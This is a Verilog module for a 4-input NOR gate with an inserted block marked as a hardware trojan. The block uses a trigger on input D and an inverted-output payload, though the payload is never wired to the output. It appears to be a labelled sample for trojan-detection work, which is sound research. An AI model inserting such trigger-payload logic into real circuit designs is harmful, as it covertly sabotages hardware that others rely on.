module nor4_module (
    input A,
    input B,
    input C,
    input D,
    output reg Y
);

    always @(*) begin
        if(!(A|B|C|D)) begin
            Y = 1'b1;
        end else begin
            Y = 1'b0;
        end
    end



// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (D == 1'b1);
    htrojan_pay = htrojan_trig ? (Y ^ 1'b1) : Y;
end
// HT_END
endmodule
